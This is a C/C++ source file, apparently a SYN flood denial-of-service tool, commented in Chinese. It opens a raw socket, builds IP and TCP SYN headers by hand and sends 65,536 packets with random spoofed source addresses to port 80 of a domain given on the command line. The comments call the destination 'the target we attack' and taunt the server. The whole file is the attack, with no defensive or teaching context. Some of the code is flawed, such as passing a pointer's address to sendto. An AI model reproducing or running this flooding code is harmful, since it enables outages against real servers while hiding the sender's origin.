#include <arpa/inet.h>
#include <errno.h>
#include <iostream>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

char* getIpByDomain(char* domain){
	struct hostent *host;
	return ((host=gethostbyname(domain))==NULL) ? NULL : inet_ntoa(*((struct in_addr *)host->h_addr));
}

void send_p(int sockfd,struct sockaddr_in *addr){
char buffer[100]; /**** 用来放置我们的数据包 ****/
struct ip *ip;
int i;
struct tcphdr *tcp;
int head_len;

/******* 我们的数据包实际上没有任何内容,所以长度就是两个结构的长度 ***/

head_len=sizeof(struct ip)+sizeof(struct tcphdr);

bzero(buffer,100);

/******** 填充IP数据包的头部,还记得IP的头格式吗? ******/
ip=(struct ip *)buffer;
ip->ip_v=IPVERSION; /** 版本一般的是 4 **/
ip->ip_hl=sizeof(struct ip)>>2; /** IP数据包的头部长度 **/
ip->ip_tos=0; /** 服务类型 **/
ip->ip_len=htons(head_len); /** IP数据包的长度 **/
ip->ip_id=0; /** 让系统去填写吧 **/
ip->ip_off=0; /** 和上面一样,省点时间 **/
ip->ip_ttl=MAXTTL; /** 最长的时间 255 **/
ip->ip_p=IPPROTO_TCP; /** 我们要发的是 TCP包 **/
ip->ip_sum=0; /** 校验和让系统去做 **/
ip->ip_dst=addr->sin_addr; /** 我们攻击的对象 **/

/******* 开始填写TCP数据包 *****/
tcp=(struct tcphdr *)(buffer +sizeof(struct ip));
tcp->source=htons(80);
tcp->dest=addr->sin_port; /** 目的端口 **/
tcp->seq=random();
tcp->ack_seq=0;
tcp->doff=5;
tcp->syn=1; /** 我要建立连接 **/
tcp->check=0;


/** 好了,一切都准备好了.服务器,你准备好了没有?? ^_^ **/
for(unsigned long u=0;u<65536;u++)
{
/** 你不知道我是从那里来的,慢慢的去等吧! **/
ip->ip_src.s_addr=random();

/** 什么都让系统做了,也没有多大的意思,还是让我们自己来校验头部吧 */
/** 下面这条可有可无 
tcp->check=check_sum((unsigned short *)tcp,
sizeof(struct tcphdr));*/
int s;
if((s=sendto(sockfd,buffer,head_len,0,(struct sockaddr*)&addr,sizeof(struct sockaddr_in))) <=0){
	printf("%d",s);
	return;
}
}
}

int main(int argc, char *argv[]) {
	setuid(getpid());
	char* IP;
	IP = getIpByDomain(argv[1]);
	int PORT=80;
//	PORT = atoi(argv[2]);
	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);//
	if ( sockfd < 0) {
		printf("Error: socketError:%d\n%s\n",sockfd,strerror(errno));
		return sockfd;
	};
	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(PORT);
	server_addr.sin_addr.s_addr = inet_addr(IP);
	int on=1;
	setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
	send_p(sockfd, &server_addr);
	close(sockfd);
	return 0;
};

